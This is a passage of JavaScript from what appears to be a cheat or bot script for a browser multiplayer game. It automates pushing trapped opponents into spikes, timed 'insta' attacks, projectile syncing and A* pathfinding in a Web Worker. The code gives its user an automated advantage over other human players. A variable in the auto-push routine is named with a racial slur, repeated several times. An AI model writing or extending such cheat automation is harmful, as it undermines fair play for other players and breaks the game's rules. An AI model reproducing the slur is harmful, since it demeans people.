    if(!a.x2&&b.x2)return sqrt(pow((b.y2-a.y), 2) + pow((b.x2-a.x), 2));
}
function spliceIncludes(arr1, arr2) {
    for (let i = 0, tmp, e; i < arr1.length; i++) {
        for (e = arr2.length, tmp = arr1[i]; e--;) {
            if (tmp === arr2[e]) {
                arr1.splice(i, 1);
                arr2.splice(e, 1);
                i--;
                break;
            }
        }
    }
}
function getAimer(a, b){ // point, target
    return atan2((b.y2||b.y) - (a.y2||a.y), (b.x2||b.x) - (a.x2||a.x)) // Math.atan2(y, x) parameters
}
// this function is why it broke
//const objDist = (a, b) => sqrt((a.x2 || a.x - b.x2 || b.x) ** 2 + (a.y2 || a.y - b.y2 || b.y) ** 2);
function objDist(a, b){
    return hypot((a.x2||a.x) - (b.x2||b.x), (a.y2||a.y) - (b.y2||b.y));
}



function dot(a, x, y){
    return (a.x*x+a.y*y)/(a.x*y-a.y*x)
}

var mySpeed,DefaultSpeed = 65,pushVector = {x:null,y:null,objs:[],dev:null,dir:null},pushCoords = {x:null,y:null}
/* let hatSpeed = (function(e){for(let i=0;i<Xt.length;i++)if(e==Xt[i].id){return Xt[i].spdMult}})(lastHat) || 1;
    let accSpeed = (function(e){for(let i=0;i<Gt.length;i++)if(e==Gt[i].id){return Gt[i].spdMult}})(lastTail) || 1;
    let wepSpeed = R.weapons[E.weapons[E.weaponIndex] || E.weapons[0]].spdMult || 1;
    mySpeed = DefaultSpeed * wepSpeed * hatSpeed * accSpeed * (E.y2 < T.snowBiomeTop && lastHat != 15 ? T.snowSpeed : 1);*/
function wyndAP(Z,t,b,GG,_,enemyV,useVel){
    if (!nearestenemy?.inTrap || !nearestenemy || !autopusher||nearestenemy && E.skinIndex==45&& dist(E,nearestenemy)>90) {
        pushing = false;
        pusher = false;
        pushPosition = 'not';
        pushVector = 'not'
        pushCoords = 'not'//{x:null,y:null}
        moveAuto == 'autopush' && knla.send('9', undefined)
        return false;
    }

    let virtualPos;
    let wes2025niggas;
    pushing = false;
    pusher = false;
    // useVel = true;
    //  enemyV = useVel ? nearestenemy.np.decel : nearestenemy
    Z = getAimer(E,nearestenemy)
    pushVector = {x:cos(Z), y:sin(Z),objs:[],dev:null,dir:null};

    let objs = nearObjects.sort((a, b) => dist(a, nearestenemy) - dist(b, nearestenemy));
    for(let i = 0;i < objs.length;i++){
        _ = objs[i];
        if(nearestenemy.inTrap.sid === _.sid) continue;
        // id 6-9 are all spikes
        if(dist(nearestenemy.inTrap, _) <= 50 + (_.type == 1 ? _.scale * 0.55 : _.scale) + 26 && ((clan(_?.owner?.sid) && _?.group?.name == 'spikes') || (!nearestenemy.team && _?.group?.name == 'spikes' && _?.owner?.sid != nearestenemy.sid) || (_?.type === 1 && _.y >= 12000))
           || pushVector.objs.length === 1 && dist(_, nearestenemy.inTrap) <= 50 + _.scale + 22.5 && dist(_,pushVector.objs[0]) <= pushVector.objs[0].scale + _.scale + 42.5 && !_.ignoreCollision){
            let a = atan2(_.y - nearestenemy.y2, _.x - nearestenemy.x2);
            let d = 170 - objDist(_, nearestenemy);
            if(pushVector.objs[0] && dAng(getAimer(_,nearestenemy.inTrap),getAimer(pushVector.objs[0],nearestenemy.inTrap)) <= 1.9 && dist(_,pushVector.objs[0])<=_.scale+pushVector.objs[0].scale+67.5|| !pushVector.objs.length){
                pushVector.x += d * cos(a);
                pushVector.y += d * sin(a);

                if(pushVector.objs[0])console.log(dAng(getAimer(_,nearestenemy.inTrap),getAimer(pushVector.objs[0],nearestenemy.inTrap)),Math.round(dist(_,pushVector.objs[0]))-(pushVector.objs[0].scale + _.scale));
                // console.log(pushVector.objs.length, dist(_, nearestenemy.inTrap) <= 50 + _.scale + 15 , pushVector.objs.length && dist(_,pushVector.objs[0]) <= pushVector.objs[0].scale + _.scale + 21, !_.ignoreCollision)
                pushVector.objs.push(_)
            }

            if(dot(pushVector, nearestenemy.inTrap.x - nearestenemy.x2, nearestenemy.inTrap.y - nearestenemy.y2) > 0){
                pushVector.x += (nearestenemy.inTrap.x - nearestenemy.x2)*2;
                pushVector.y += (nearestenemy.inTrap.y - nearestenemy.y2)*2;
            }
        }
    }// 36 lowest so far

    if(fastHypot(pushVector.x, pushVector.y) > 5){
        let distToEnemy = objDist(nearestenemy,E)
        let tau = dAng(Z, atan2(pushVector.y, pushVector.x));
        let spike = pushVector.objs[0]
        let decide = dist(nearestenemy,spike)<=spike.scale+38.75
        let opposite = 3600 + pow(distToEnemy, 2) - (28.5+(decide ? 71.5 : 0)) * distToEnemy * cos(tau);
        let deviance = Math.acos((pow(distToEnemy, 2) + opposite - 3600)/(2 * distToEnemy * sqrt(opposite)));
        if(deviance){
            wes2025niggas = Z - Math.sign((nearestenemy.x2 - E.x2) * (pushVector.y) - (nearestenemy.y2 - E.y2) * (pushVector.x)) * deviance;
            let distanceToTarget = dist(E,nearestenemy) + 30
            pushCoords = {x: E.x2 + distanceToTarget * cos(wes2025niggas),
                          y: E.y2 + distanceToTarget * sin(wes2025niggas)};
         
            let pushThreat = runInto(E, wes2025niggas, bTw(E, wes2025niggas, E, 1));
            let align = dAng(getAimer(nearestenemy, spike), getAimer(E, nearestenemy)) <= 2;
            if( ((!nearestenemy.hitSpike||dist(E,pushCoords)>100&& nearestenemy.hitSpike)  && align && !pushThreat)){
                knla.send('9',wes2025niggas,'autopush')
                pushVector.dev = deviance
                pushVector.dir = wes2025niggas;
            }else{
                // wes2025niggas = null;
                knla.send('9',null,'autopush')

            }
            pushing = true;
            pusher = true;
        }
    }
}
function autopush(ez, e, t) {
    if (!nearestenemy?.inTrap || !nearestenemy || !autopusher) {
        pushing = false;
        pusher = false;
        pushPosition = 'not';
        pushCoords = 'not'
        moveAuto == 'autopush' && knla.send('9', undefined)
        pushVector = 'not';
        return false;
    }

    if (!ez) ez = [];
    let s = nearObjects
    .filter(e => !ez.includes(e.sid) && dist(nearestenemy.inTrap, e) <= 50 + (e.type == 1 ? e.scale * 0.55 : e.scale) + 26 && ((clan(e?.owner?.sid) && e?.group?.name == 'spikes') || (!nearestenemy.team && e?.group?.name == 'spikes' && e?.owner?.sid != nearestenemy.sid) || (e?.type == 1 && e.y >= 12000)))
    .sort((a, b) => dist(a, nearestenemy) - dist(b, nearestenemy));

    if (!s.length || dist(E, nearestenemy) >= 400) {
        pusher = false;
        pushing = false;
        pushPosition = 'not';
        pushVector = 'not';
        pushCoords = 'not'
        moveAuto == 'autopush' && knla.send('9', undefined)
        return false;
    }

    nearestenemy = findPlayerSID(nearestenemy.sid);

    const sx = nearestenemy.x2 - s[0].x;
    const sy = nearestenemy.y2 - s[0].y;
    const px = nearestenemy.x2 - E.x2;
    const py = nearestenemy.y2 - E.y2;
    const tx = nearestenemy.x2 - nearestenemy.inTrap.x;
    const ty = nearestenemy.y2 - nearestenemy.inTrap.y;
    const tsx = s[0].x - nearestenemy.inTrap.x;
    const tsy = s[0].y - nearestenemy.inTrap.y;

    const sm = sqrt(sx * sx + sy * sy);
    sTE = {
        x: sx / sm,
        y: sy / sm
    };

    const pm = sqrt(px * px + py * py);
    pTE = {
        x: px / pm,
        y: py / pm
    };

    const tm = sqrt(tx * tx + ty * ty);
    tTE = {
        x: tx / tm,
        y: ty / tm
    };

    const tsm = sqrt(tsx * tsx + tsy * tsy);
    let tTS = {
        x: tsx / tsm,
        y: tsy / tsm
    };

    const a = [atan2(sTE.y, sTE.x), atan2(tTE.y, tTE.x), atan2(pTE.y, pTE.x)];
    const aa = [(a[0] + a[1]) / 2, (a[0] + a[2]) / 2];

    const av = [
        { x: cos(aa[0]), y: sin(aa[0]) },
        { x: cos(aa[1]), y: sin(aa[2]) }
    ];

    dPAP =(sTE.x * pTE.x) + (sTE.y * pTE.y)// (av[0].x * pTE.x) + (av[0].y * pTE.y);

    sos3 = s[0]?.type == 1 ? (s[0].scale * 0.55, s[0].realScale = s[0].scale * 0.55) : s[0].scale;
    apS = s[0];

    pushPosition = {
        x: nearestenemy.x2 + sTE.x * (dPAP + sos3),
        y: nearestenemy.y2 + sTE.y * (dPAP + sos3)
    };

    const ang = getAimer(E, pushPosition);
    const distToPos= dist(E, pushPosition);
    const angDiff = dAng(ang, getAimer(E, nearestenemy));
    t = distToPos<= 100 && angDiff <= 2; // 2 or 2.3

    let collider = ue.checkCollision2(nearestenemy, s[0]);
    let ar = { x: nearestenemy.x2, y: nearestenemy.y2, scale: 35, do: true };
    // let o = nearObjects;
    let obstacles = t ? nearObjects : nearObjects.concat(ar);
    let tX = Date.now();
    paths = [];

    if (collider) {
        doSpikeInsta();
    }
    if(nearestenemy.hitSpike){
        pushing = false;
        pusher = false;
        pushPosition = 'not';
        pushCoords = 'not'
        moveAuto == 'autopush' && knla.send('9', undefined)
        pushVector = 'not';
        return;
    }
    if(t){
        wyndAP()
    }
   
    if(!t){
      
        pathfind({
            player: E,
            target: { x: nearestenemy.x2 + sTE.x * (dPAP + sos3 + 35), y: nearestenemy.y2 + sTE.y * (dPAP + sos3 + 35) },
            buildings: obstacles,
            clan: clanMates
        }).then(foundPath => {
            let p = foundPath;
            nearestenemy = findPlayerSID(nearestenemy.sid);
            pusher = false;
            pushing = true;

            if (!p) {
                pusher = false;
                pushing = false;
                pushPosition = 'not';
                pushVector = 'not';
                pushCoords = 'not'
                // ez.push(s[0].sid);
                // autopush(ez);
                return false;
            }

            e = moveToPath(tX, 360,true);

            if (!e) {
                pusher = false;
                pushing = false;
                pushPosition = 'not';
                pushVector = 'not';
                pushCoords = 'not'
                //  ez.push(s[0].sid);
                paths = [];
                // autopush(ez);
                return;
            }


        }).catch(error => {
            pushing = false;
            pusher = false;
            pushPosition = 'not';
            return false;
        });
    }
}










async function doSpikeInsta(){
    if(nearestenemy&&(nearestenemy.weaponR==1||nearestenemy.skinIndex!=6)&&!wr_obj&&(dist(E.np.accel,nearestenemy.np.real,"player")<=R.weapons[primary].range||dist(E,nearestenemy,"player")<=R.weapons[primary].range)&&E.pr==1&&amAlive&&(nearestenemy.weaponIndex==11&&C.getAngleDist(getAimer(E,nearestenemy)+PI,nearestenemy.dir)>PI / 3||nearestenemy.weaponIndex!=11)){
        WR = false;
        wr_obj = true;
        if(E.skinIndex != 11){Hg(7,18)} else storeEquip(19, 1)
        aim[0] = getAimer(E,nearestenemy)
        visAim = true;
        knla.send("D",getAimer(E,nearestenemy), "client");
        knla.send("z",primary,true)
        hold = primary
        await nextTick()
        Hg(53)
        //  console.log(nearestenemy.np.real.type);
        await nextTick();
        wr_obj = false;
    }
}




function nreload(e,t){
    if(!e) return;
    !t&&(t=111)
    return min(1, e.weaponR + t/R.weapons[e.weaponIndex]?.speed)
}

function inrange(e,t,r,v){
    return dist(e,t,"player")<=r||v&&dist(e?.np?.real,t?.np?.real,"player")<=r
}



function calcprojHit(start,target,projectileType,projectileSpeed,d,t){
    d = dist(start,target)-35;
    t = d / (projectileSpeed*111)
    return t;
}

function syncproj(players, target,type,speed) {
    const pP = players.map(player => {
        let coords = calcPoint(player.x2,player.y2,getAimer(player,target),35)
        const musketTicks = calcprojHit(coords,target,5,3.6);
        const turretBallTicks = calcprojHit(coords,target,1,1.54);
        return { player, musketTicks, turretBallTicks };
    });
    pP.sort((a, b) => a.musketTicks - b.musketTicks);
    const maxTurretBallTicks = max(...pP.map(proj => proj.turretBallTicks));
    pP.forEach(proj => {
        proj.waitTicksForTurretBall = maxTurretBallTicks - proj.turretBallTicks;
    });
    const syncOrder = pP.map(proj => proj.player.name);
    pP.forEach(proj => {
        proj.waitTimeForMusket = proj.musketTicks * 111;
        proj.waitTimeForTurretBall = proj.waitTicksForTurretBall * 111;
    });
    return { pP, syncOrder };
}





function generateRandomColor(existingColors) {
    const hue = floor(Math.random() * 360);
    const saturation = floor(Math.random() * 81) + 20; // Saturation range: 20-100
    const lightness = floor(Math.random() * 61) + 20; // Lightness range: 20-80
    const newColor = `hsl(${hue}, ${saturation}%, ${lightness}%)`;
    if(!existingColors) return newColor;
    if(existingColors.some(({color}) => color &&isSimilarColor(color, newColor))) {
        // If a similar color exists in the array, recursively generate a new color
        return generateRandomColor(existingColors);
    }

    return newColor;
}

function isSimilarColor(color1, color2) {
    // Calculate the color difference using the CIE76 formula
    const [h1, l1, s1] = colorToHsl(color1);
    const [h2, l2, s2] = colorToHsl(color2);
    const hueDiff = abs(h1 - h2);
    const lightnessDiff = abs(l1 - l2);
    const saturationDiff = abs(s1 - s2);

    return hueDiff <= 60 && lightnessDiff <= 20 && saturationDiff <= 20;
}

function colorToHsl(color) {
    const div = color.indexOf(",") > -1 ? "," : " ";
    const [r, g, b] = color
    .substr(color.indexOf("(") + 1)
    .split(")")[0]
    .split(div)
    .map(Number);

    const rRatio = r / 255;
    const gRatio = g / 255;
    const bRatio = b / 255;

    const max = Math.max(rRatio, gRatio, bRatio);
    const min = Math.min(rRatio, gRatio, bRatio);

    let hue, saturation, lightness;

    if (max === min) {
        hue = 0;
    } else if (max === rRatio) {
        hue = 60 * ((gRatio - bRatio) / (max - min)) + 0;
    } else if (max === gRatio) {
        hue = 60 * ((bRatio - rRatio) / (max - min)) + 120;
    } else {
        hue = 60 * ((rRatio - gRatio) / (max - min)) + 240;
    }

    lightness = (max + min) / 2;

    if (max === min) {
        saturation = 0;
    } else if (lightness <= 0.5) {
        saturation = (max - min) / (max + min);
    } else {
        saturation = (max - min) / (2 - max - min);
    }

    return [round(hue), round(lightness * 100), round(saturation * 100)];
}

function bScale(e){
    return e.type === 1 && e.y >= 12000? e.scale * .55 : e.type === 1 ? e.scale * .6 : e.type === 0 ? e.scale * .7 : e.scale
}



const WorkerCode = `
self.onmessage = (msg) => {

    const bitmap = msg.data.bitmap;
    const player = JSON.parse(msg.data.R)
    const time = msg.data.time
    const size = msg.data.size
    const res = msg.data.res
    const canvas = new OffscreenCanvas(bitmap.width, bitmap.height);
    const ctx = canvas.getContext("2d");
    ctx.drawImage(bitmap, 0, 0);
    ctx.clearRect(Math.floor(bitmap.width/2), Math.floor(bitmap.height/2), 1, 1);

    const endpoints = [];
    const data = ctx.getImageData(0,0,bitmap.width, bitmap.height).data;

    const map = new Map(canvas,player,size,res);

    for(let i = 0;i < data.length;i += 4){

        let l = i / 4;

map.graph[l % bitmap.width][Math.floor(l / bitmap.width)].cost = data[i]


        if(data[i + 2]){
            endpoints.push({
                x: l % bitmap.width,
                y: Math.floor(l / bitmap.width),
            });
        }
    }
    bitmap.close();

    if(!endpoints.length){
        endpoints.push(map.getCentreNode());
    }

    //begin the pathfinding

    let openSet = new BinHeap();
    openSet.setCompare = (a, b) => a.f > b.f;
    openSet.push(map.getCentreNode());

    let currentNode;


    while(openSet.length){
        currentNode = openSet.remove(0)

        if(endpoints.some((goal) => goal.x == currentNode.x && goal.y == currentNode.y)){
            break;
        }

        let neighbors = map.getNeighbor(currentNode.x, currentNode.y,player,size,res);
        for(let i = 0;i < neighbors.length;i++){
            let neighbor = neighbors[i];
            if(neighbor && neighbor.cost == 0){//make weighted later
                let tempG = currentNode.g + Map[i % 2 == 0 ? "DiagonalCost" : "TraversalCost"];
                if(tempG < neighbor.g){
                    neighbor.parent = currentNode;
                    neighbor.g = tempG;
                    neighbor.h = Math.min.apply(Math, endpoints.map((goal) => fastHypot(neighbor.x - goal.x, neighbor.y - goal.y)));
                    if(!neighbor.inset){
                        openSet.insert(neighbor);
                    }
                }
            }
        }
    }


    //recontruct path
    if(!endpoints.some((goal) => goal.x == currentNode.x && goal.y == currentNode.y)){
        currentNode = map.getLowest('h',player,size,res);
    }
    let output = [];
    while(currentNode.parent){
        let nextNode = currentNode.parent;
        let d = Math.round(Math.atan2(nextNode.y - currentNode.y, nextNode.x - currentNode.x) / Math.PI * 4);
        if(d < 0){d+=8};
        output.push(d);
        currentNode = nextNode;
    }
    output = new Uint8Array(output.reverse()).buffer;

    self.postMessage(output, [output]);

}

//approximate hypot
function fastHypot(a, b){
    const c = Math.SQRT2-1;
    a = Math.abs(a);
    b = Math.abs(b);
    if(a > b){
        let temp = a;
        a = b;
        b = temp;
    }
    return (c * a) + b
}

//Map Constructor for object
class Map{
    static TraversalCost = 1;
    static DiagonalCost = Math.sqrt(2) * 1;
    constructor(canvas,player,size,res){
        //init variables
        this.width = canvas.width;
        this.height = canvas.height;

        this.middleWidth = Math.floor(this.width / 2);
        this.middleHeight = Math.floor(this.height / 2);
        this.graph = new Array(canvas.width);

        for(let x = 0;x < this.width;x++){
            this.graph[x] = new Array(this.height);
            for(let y = 0;y < this.height; y++){
                this.graph[x][y] = new Node(x, y);
            }
        }
        this.getCentreNode(player,size,res).g = 0;
        this.getCentreNode(player,size,res).pending = false;
    }
    getLowest(type,player,size,res){
        let lowestNode = this.graph[0][0];
        for(let x = 0;x < this.width;x++){

            for(let y = 0;y < this.height; y++){

            let node = this.getNode(x, y, player,size,res)
                if(lowestNode[type] > node[type]){
                    lowestNode = node;
                }
            }
        }
        return lowestNode;
    }
    getNode(x, y, player,size,res){

let X =  x*res+ player.x2-size, Y = y*res + player.y2-size
if(X<0||Y<0||X>14400||Y>14400){
if(this.graph[x] && this.graph[x][y]?.cost!=undefined){
this.graph[x][y].cost = 100
return this.graph[x][y];
}

return undefined
 }


        if(this.graph[x]){
            return this.graph[x][y];
        }
    }
    getCentreNode(player,size,res){
        return this.graph[this.middleWidth][this.middleHeight];
    }
    getNeighbor(x, y,player,size,res){

        return [
            this.getNode(x - 1, y - 1,player,size,res),
            this.getNode(x + 0, y - 1,player,size,res),
            this.getNode(x + 1, y - 1,player,size,res),
            this.getNode(x + 1, y + 0,player,size,res),
            this.getNode(x + 1, y + 1,player,size,res),
            this.getNode(x + 0, y + 1,player,size,res),
            this.getNode(x - 1, y + 1,player,size,res),
            this.getNode(x - 1, y + 0,player,size,res),
        ]
    }

lineOfSight(node1, node2) {
    let x0 = node1.x;
    let y0 = node1.y;
    let x1 = node2.x;
    let y1 = node2.y;

    let dx = Math.abs(x1 - x0);
    let dy = Math.abs(y1 - y0);
    let sx = x0 < x1 ? 1 : -1;
    let sy = y0 < y1 ? 1 : -1;
    let err = dx - dy;

    while (x0 !== x1 || y0 !== y1) {
        if (this.graph[x0][y0].cost !== 0) {
            return false; // Line-of-sight blocked
        }

        let e2 = 2 * err;
        if (e2 > -dy) {
            err -= dy;
            x0 += sx;
        }
        if (e2 < dx) {
            err += dx;
            y0 += sy;
        }
    }

    return true; // Line-of-sight clear
}
}

//Node for Map
class Node{
    constructor(x, y){
        this.x = x;
        this.y = y;
        this.g = Number.POSITIVE_INFINITY;//distance to start
        this.h = Number.POSITIVE_INFINITY;//estimated distance to end
        this.parent;//where it came from
    }
    get f(){
        return this.h + this.g;
    }
}

//binary heap object constructor
class BinHeap extends Array {
    //private variable declaration
    #compare = (a, b) => a < b;
    //constuctor
    constructor(len = 0) {
        super(len);
    }
    //change compare function
    set setCompare(func) {
        if (typeof func == "function") {
            this.#compare = func;
        } else {
            throw new Error("Needs a function for comparing")
        }
    }
    //sort into a binary heap
    sort() {
        for (let i = Math.trunc(this.length / 2); i >= 0; i--) {
            this.siftDown(i)
        }
    }
    //old array sort
    arraySort(compare) {
        super.sort(compare)
    }
    //sift down
    siftDown(index) {
        let left = index * 2 + 1;
        let right = index * 2 + 2;
        let max = index;
        if (left < this.length && this.#compare(this[max], this[left])){
            max = left;
        }
        if (right < this.length && this.#compare(this[max], this[right])){
            max = right;
        }
        if (max != index) {
            this.swap(index, max);
            this.siftDown(max);
        }
    }
    //sift up
    siftUp(index) {
        let parent = (index - (index % 2 || 2)) / 2;
        if (parent >= 0 && this.#compare(this[parent], this[index])) {
            this.swap(index, parent);
            this.siftUp(parent);
        }
    }
    //inserts element into the binary heap
    insert(elem) {
        this.push(elem);
        this.siftUp(this.length - 1);
    }
    //removes elem at index from binary heap
    remove(index) {
        if (index < this.length) {
            this.swap(index, this.length - 1);
            let elem = super.pop();
            this.siftUp(index);
            this.siftDown(index);
            return elem;
        } else {
            throw new Error("Index Out Of Bounds")
        }
    }
    //changes elem at index
    update(index, elem) {
        if (index < this.length) {
            this[index] = elem;
            this.siftUp(index);
            this.siftDown(index);
        } else {
            throw new Error("Index Out Of Bounds")
        }
    }
    //swap two elem at indexes
    swap(i1, i2) {
        let temp = this[i1];
        this[i1] = this[i2];
        this[i2] = temp;
    }
}
`;


//pathfinding instance
var Timer;
var genTime;
class WorkerAStar{
    constructor(size, resolution){
        //setup essential variables
        this.size = size;
        this.res = resolution;
        this.prevPos = {};
        this.prevPath = [];//might change
        //helpCommands()

        //setup worker
        this.blob = new Blob([
            WorkerCode
        ], {
            type: "application/javascript"
        })
        this.url = URL.createObjectURL(this.blob);
        this.worker = new Worker(this.url);
        this.worker.url = this.url;

        //message receiving
        this.worker.onmessage = (msg) => {
            genTime = Date.now()-Timer
            this.attemptFulfil(new Uint8Array(msg.data));
        }

        //error handling
        this.worker.onerror = (err) => {
            throw err;
        }

        this.initiateCanvas();

        //test canvas
        //  var canvasMap = document.createElement("CANVAS");
        //  canvasMap.id = 'canvasMap';
        // document.body.append(canvasMap);
        //  canvasMap.style.zIndex = "-1";
        //  canvasMap.style = "position:absolute; left: 50%; top: 60px;margin-left:-100px; pointer-events: none; border-style:solid;";
        //   this.mapWriter = canvasMap.getContext("2d");
        //   canvasMap.width = Math.ceil(this.size * 2 / this.res) + 1;
        //   canvasMap.height = Math.ceil(this.size * 2 / this.res) + 1;
    }
    close() {
        this.worker.terminate();
        URL.revokeObjectURL(this.url);
        Tach = null;
    }
    //attempts to recieve a message
    attemptFulfil(msg, depth = 0){
        if(this.resolve){
            //relay message onward
            this.resolve(msg);
            this.resolve = null;
        }else{
            //allow 5 attempts to recieve
            if(depth < 10){
                setTimeout(() => {
                    //could have just passed function as param, but this is more "consistent"
                    this.attemptFulfil(msg, depth + 1);
                }, 0);
            }else{
                console.error("Unexpected Message from Worker at ", this);
            }
        }
    }

    //gets new canvas
    initiateCanvas(){
        this.width = ceil(this.size * 2 / this.res) + 1;
        if(this.canvas){
            this.canvas.width = this.width;
            this.canvas.height = this.width;
        }else{
            this.canvas = new OffscreenCanvas(this.width, this.width);
            //console.log(this.canvas,this.width)
            this.ctx = this.canvas.getContext("2d");
        }
    }

    //setter for buildings
    setBuildings(buildings){
        this.buildings = buildings;
    }

    //set estimates speed
    setSpeed(spd){
        this.estimatedSpeed = spd;
    }

    //set pos in real time
    setPos(x, y){
        this.x = x;
        this.y = y;
    }

    //clear the previous path to force a recalculation
    clearPath(){
        this.prevPath = [];
    }
    pathBlocked(e){
        if(dist(e[0],Tach.finalGoal)>=30){
            this.pathBlocked = true;
        }
    }
    async drawPath(ctx, pathColor = "#0000FF", myPos = this, dirColor = "#00FF00"){
        if(this.prevPath.length){
            //draw path
            //    ctx.strokeStyle = "#00ffb3";
            /*  ctx.lineWidth = 5;
            ctx.globalAlpha = 1;
            ctx.beginPath();
            for(let i = 0;i < this.prevPath.length;i++){
                const hue = (i / (this.prevPath.length)) * 360;
        ctx.strokeStyle = `hsl(${hue}, 100%, 50%)`;
              //  ctx.strokeStyle = "#00ffb3";
                ctx.lineTo(this.prevPath[i].x, this.prevPath[i].y);
                ctx.moveTo(this.prevPath[i].x, this.prevPath[i].y);
            }
 ctx.stroke();
*/

            /*ctx.lineWidth = 5;

const colorSpeed = 0.0004; // Adjust this value to control the color movement speed
const currentTime = Date.now() * colorSpeed;

for (let i = 0; i < this.prevPath.length - 1; i++) {
    const t1 = i / (this.prevPath.length - 1);
    const t2 = (i + 1) / (this.prevPath.length - 1);

    const offset = (currentTime % 1);
    const colorStop1 = (t1 + offset) % 1;
    const colorStop2 = (t2 + offset) % 1;

    const gradient = ctx.createLinearGradient(
        this.prevPath[i].x, this.prevPath[i].y,
        this.prevPath[i + 1].x, this.prevPath[i + 1].y
    );
  //  gradient.addColorStop(colorStop2, #20A4F3);
    gradient.addColorStop(colorStop2, "#03191E");
gradient.addColorStop(colorStop2, "#20A4F3");
   // gradient.addColorStop(colorStop1, "rgba(163, 0, 133, 10)"); // Dark Magenta
  //  gradient.addColorStop(colorStop2, "rgba(0, 255, 204, 10)"); // Bright Turquoise

    ctx.beginPath();
    ctx.strokeStyle = gradient;
    ctx.moveTo(this.prevPath[i].x, this.prevPath[i].y);
    ctx.lineTo(this.prevPath[i + 1].x, this.prevPath[i + 1].y);
    ctx.stroke();
}*/


            const currentTime = Date.now() * .3;
            ctx.lineWidth = 5;

            ctx.globalAlpha = 1;
            for (let i = 0; i < this.prevPath.length - 1; i++) {

                const hue1 = ((i / (this.prevPath.length - 1) * 360) + currentTime) % 360;
                const hue2 = (((i + 1) / (this.prevPath.length - 1) * 360) + currentTime) % 360;
                const [r1, g1, b1] = hslToRgb(hue1 / 360, 1, 0.55);
                const [r2, g2, b2] = hslToRgb(hue2 / 360, 1, 0.55);

                const gradient = ctx.createLinearGradient(
                    this.prevPath[i].x, this.prevPath[i].y,
                    this.prevPath[i + 1].x, this.prevPath[i + 1].y
                );
              gradient.addColorStop(0, "rgba(24, 0, 83, .3)");

                ctx.beginPath();

                ctx.moveTo(this.prevPath[i].x, this.prevPath[i].y);
                ctx.lineTo(this.prevPath[i + 1].x, this.prevPath[i + 1].y);
                ctx.strokeStyle = gradient;
                ctx.stroke();
            }



        }
    }

    //async function for recieving response
    async response(){
        return await new Promise((resolve) => {
            this.resolve = resolve;
        });
    }
    //attempt to get a path
    checkBoundaries(x,y){
        return (x>=0&&y>=0&&x<=14400&&y<=14400)
    }
    fastHypot(a, b){
        const c = Math.SQRT2-1;
        a = Math.abs(a);
        b = Math.abs(b);
        if(a > b){
            let temp = a;
            a = b;
            b = temp;
        }
        return (c * a) + b
    }
    getPath(){
        window.pf = this;
        for(let i in this.prevPath){
            let point = this.prevPath[i];
            //   console.log(this.prevPath)if (point.x < 0 &&point.y < 0 &&point.x > 14400 &&point.y > 14400) continue;

            let dist = Math.hypot(E.x2 - point.x, E.y2 - point.y);

            if(dist < this.estimatedSpeed + this.res * 2){
                if(dist > this.estimatedSpeed){
                    return {
                        ang: Math.atan2(point.y - E.y2, point.x - E.x2),
                        dist: parseInt(i),
                    };
                }else{
                    break;
                }
            }
        }
    }

    //makes position on the canvas(may improve, repl.it/@pyrwynd, project:test map)
    norm(value){
        //  console.log(this)
        return Math.max(0, Math.min(this.width - 1, value));
    }

    async initCalc(positions, append = false,force){
        //prevents multiple instances of calculation
        if(this.resolve){
            return;
        }

        //sets last position
        this.prevGoal = positions.map((elem) => {
            return {
                x: elem.x,
                y: elem.y,
            }
        })

        //modify position values
        if(append&&!force){
            this.prevPos = this.prevPath[0];
        }else{
            this.prevPos = {
                x: this.x,
                y: this.y,
            }
        }
        positions = positions.map((elem) => {
            // console.log(elem.x,this.prevPos.x,this.norm((elem.x - this.prevPos.x + this.size) / this.res))
            return {x: this.norm((elem.x - this.prevPos.x + this.size) / this.res),
                    y: this.norm((elem.y - this.prevPos.y + this.size) / this.res)}
        })

        //put buildings on canvas here
        const Circle = PI2;
        this.ctx.fillStyle = "#FF0000";
        for(let obj of this.buildings){
            let x = (obj.x - this.prevPos.x + this.size) / this.res;
            let y = (obj.y - this.prevPos.y + this.size) / this.res;
            let r = obj.pathScale

            this.ctx.beginPath();
            this.ctx.arc(x, y, r / this.res, 0, Circle);
            this.ctx.fill();
        }

        //draw destination on canvas
        this.ctx.fillStyle = "#0000FF";
        for(let goal of positions){
            this.ctx.fillRect(Math.round(goal.x), Math.round(goal.y), 1, 1);
        }

        //test canvas draw
        //  this.mapWriter.clearRect(0, 0, this.width, this.width);
        //  this.mapWriter.drawImage(this.canvas, 0, 0);

        //instant data transfer(saves 10ms)
        let bitmap = await createImageBitmap(this.canvas, 0, 0, this.width, this.width);
        this.worker.postMessage({bitmap, R:JSONStringify(E),time:Date.now(),res:this.res,size:this.size});
        Timer = Date.now();
        //   console.log(this.res,this.size)
        //meanwhile get a new canvas
        this.initiateCanvas();

        //wait until recieve data
        let data = await this.response();

        //turn into list of points
        const xTable = [-1, -1, 0, 1, 1, 1, 0, -1];
        const yTable = [0, -1, -1, -1, 0, 1, 1, 1];
        if(!append||force){
            this.prevPath = [];
        }
        let currPos = {
            x: this.prevPos.x,
            y: this.prevPos.y,
        };
        /*  let displayPos = {
            x: Math.floor(this.width/2),
            y: Math.floor(this.width/2),
        }*/
        for(let i = 0;i < data.length;i++){
            //  this.mapWriter
            //  console.log(currPos,"1")
            currPos = {
                x: currPos.x + xTable[data[i]] * this.res,
                y: currPos.y + yTable[data[i]] * this.res,
            }
            //  console.log(currPos,"D")
            /*  displayPos = {
                x: displayPos.x + xTable[data[i]],
                y: displayPos.y + yTable[data[i]],
            }*/
            // let condition = currPos.x >=0 && currPos.y>=0 &&currPos.x<=14400&&currPos.y<=14400 ? true : false
            //)&& this.mapWriter.fillRect(displayPos.x, displayPos.y, 1, 1);

            // condition&&
            this.checkBoundaries(currPos.x,currPos.y)&&this.prevPath.unshift(currPos);
        }
        return;
    }

    //requests a path/calculation
    async pathTo(positions,force){
        //fix positions
        if(!(positions instanceof Array)){
            positions = [positions];
        }

        //remove path if not matching
        if(this.prevGoal?.length == positions.length && this.prevGoal.every((elem, i) => elem.x == positions[i].x && elem.y == positions[i].y)||force){

            //reuse previous path if nearby
            let path = this.getPath();
            if(path){
                if(path.dist < 150||force/*this.estimatedSpeed / this.res * 5*/){
                    this.initCalc(positions, true,force);
                }
                return path;
            }
        }

        await this.initCalc(positions,false,force);
        return this.getPath();
    }
}


Pathfinder = new WorkerAStar(2000,10);



//an interface to interact with the pathfinder
class Tachyon{
    constructor(pathfinder){
        this.pathfinder = pathfinder;
        this.goal = {
            pathing: false,
            type: null,
            entity: null,
            pos: {
                x: null,
                y: null,
            },
            hasGoal:false,
        }
        this.finalGoal = {x:null,y:null}
        this.waypoints = {
            death: {
                x: null,
